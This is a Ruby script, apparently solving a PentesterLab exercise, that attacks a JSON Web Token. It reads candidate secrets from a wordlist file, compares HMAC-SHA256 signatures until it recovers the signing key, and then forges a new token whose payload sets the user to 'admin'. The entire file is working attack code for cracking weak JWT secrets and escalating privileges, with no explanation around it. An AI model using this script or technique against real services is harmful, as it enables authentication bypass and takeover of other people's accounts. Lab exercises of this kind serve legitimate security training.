require 'base64'
require 'openssl'

header = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
token = "eyJ1c2VyIjpudWxsfQ"
signature = "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

def sign(data, secret)
	Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, data)).gsub("=","")
end

File.readlines("dict").each do |line|
	line.chomp!
	if sign(header+"."+token, line) == signature
		puts line
	end
end

# secret is pentesterlab
secret = "pentesterlab"
payload = Base64.decode64(token)
puts payload
payload = Base64.urlsafe_encode64('{"user":"admin"}').gsub("=","")
signed = sign(header+"."+payload,secret)
puts header+"."+payload+"."+signed
